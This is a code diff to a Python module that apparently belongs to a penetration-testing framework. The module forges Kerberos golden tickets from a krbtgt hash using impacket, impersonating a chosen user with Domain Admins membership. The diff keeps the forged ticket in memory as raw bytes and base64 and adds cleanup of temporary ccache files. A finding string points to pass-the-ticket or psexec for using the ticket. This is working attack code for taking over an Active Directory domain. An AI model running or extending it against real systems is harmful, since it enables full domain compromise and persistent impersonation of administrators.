@@ -373,10 +373,11 @@ class GoldenTicketModule(BaseModule[GoldenTicketParams, ModuleResult]):
 
                 # Use the TICKETER approach from impacket.examples.ticketer
                 # but call the internal class directly (not via subprocess)
+                ccache_path = None
                 try:
                     from impacket.examples.ticketer import TICKETER
                     from ares.core.security import secure_mkstemp
-                    dst, _fd2 = secure_mkstemp(suffix=".ccache", prefix="ares_gt_")
+                    ccache_path, _fd2 = secure_mkstemp(suffix=".ccache", prefix="ares_gt_")
                     _os.close(_fd2)
 
                     class _TicketerOptions:
@@ -398,7 +399,7 @@ class GoldenTicketModule(BaseModule[GoldenTicketParams, ModuleResult]):
                         old_pac=False,
                         targetDomain=domain_upper,
                         dc_ip=None,
-                        filename=dst,
+                        filename=ccache_path,
                     )
                     ticketer = TICKETER(
                         username,
@@ -407,14 +408,23 @@ class GoldenTicketModule(BaseModule[GoldenTicketParams, ModuleResult]):
                         options=opts,
                     )
                     ticketer.run()
-                    if _os.path.exists(dst) and _os.path.getsize(dst) > 0:
-                        return True, dst, ""
+                    ticket_bytes = b""
+                    if _os.path.exists(ccache_path) and _os.path.getsize(ccache_path) > 0:
+                        with open(ccache_path, "rb") as f:
+                            ticket_bytes = f.read()
+                        return True, ticket_bytes, ""
                     default_local = f"{username}.ccache"
                     if _os.path.exists(default_local):
-                        import shutil as _shutil
-                        _shutil.move(default_local, dst)
-                        return True, dst, ""
-                    return False, "", "Ticket file not created"
+                        try:
+                            with open(default_local, "rb") as f:
+                                ticket_bytes = f.read()
+                            return True, ticket_bytes, ""
+                        finally:
+                            try:
+                                _os.unlink(default_local)
+                            except OSError:
+                                pass
+                    return False, b"", "Ticket file not created"
                 except (ImportError, AttributeError, TypeError) as ticketer_err:
                     # MOD-035: Fallback path blocked.
                     # The previous fallback used CCache.fromKRBCRED() to construct a ticket
@@ -444,23 +454,30 @@ class GoldenTicketModule(BaseModule[GoldenTicketParams, ModuleResult]):
                         "disabled: would produce invalid ticket without PAC/KDC signature. "
                         "Ensure impacket is properly installed. (MOD-035)"
                     ) from ticketer_err
+                finally:
+                    # MOD-034: Guaranteed cleanup of temporary ccache artifact
+                    if ccache_path and _os.path.exists(ccache_path):
+                        try:
+                            _os.unlink(ccache_path)
+                        except OSError as e:
+                            logger.warning("ccache_cleanup_failed", path=ccache_path, error=str(e))
 
             except ModuleExecutionError:
                 raise
             except Exception as exc:
-                return False, "", str(exc)[:300]
+                return False, b"", str(exc)[:300]
 
-        success, ticket_path, error_msg = await loop.run_in_executor(None, _forge)
+        success, ticket_bytes, error_msg = await loop.run_in_executor(None, _forge)
 
-        if success and ticket_path:
+        if success and ticket_bytes:
             self.finding(
                 title=f"Golden Ticket Forged for {domain} as {username}",
                 description=(
                     f"Successfully forged a Golden Ticket (Kerberos TGT) for domain {domain} "
                     f"using the krbtgt NTLM hash. The ticket impersonates '{username}' with "
                     "Domain Admins group membership. "
-                    f"Ticket saved: {ticket_path}. "
-                    "Use with: KRB5CCNAME={ticket_path} python3 psexec.py -k -no-pass domain/user@target"
+                    "Ticket retained in memory (raw['ticket_data']). "
+                    "Use with: pass-the-ticket module or psexec -k"
                 ),
                 severity=Severity.CRITICAL,
                 mitre_technique="T1558.001",
@@ -468,7 +485,7 @@ class GoldenTicketModule(BaseModule[GoldenTicketParams, ModuleResult]):
                 evidence={
                     "domain":      domain,
                     "forged_user": username,
-                    "ticket_path": ticket_path,
+                    "ticket_size": len(ticket_bytes),
                     "technique":   "Golden Ticket (krbtgt hash)",
                 },
                 remediation=(
@@ -483,11 +500,15 @@ class GoldenTicketModule(BaseModule[GoldenTicketParams, ModuleResult]):
         else:
             logger.warning("golden_ticket_failed", error=error_msg)
 
+        import base64 as _b64
+        ticket_b64 = _b64.b64encode(ticket_bytes).decode("ascii") if ticket_bytes else ""
         raw = {
             "domain": domain, "forged_as": username,
-            "success": success, "ticket_path": ticket_path,
+            "success": success,
+            "ticket_data": ticket_bytes,
+            "ticket_b64": ticket_b64,
             "error": error_msg,
         }
-        raw["golden_ticket"] = raw.get("ccache_path", raw.get("ticket_path", ""))  # OUTPUTS key
-        raw["kerberos_ticket"] = raw.get("ccache_path", raw.get("ticket_path", ""))  # OUTPUTS key
+        raw["golden_ticket"] = ticket_b64  # OUTPUTS key
+        raw["kerberos_ticket"] = ticket_b64  # OUTPUTS key
         return self._findings[:], raw
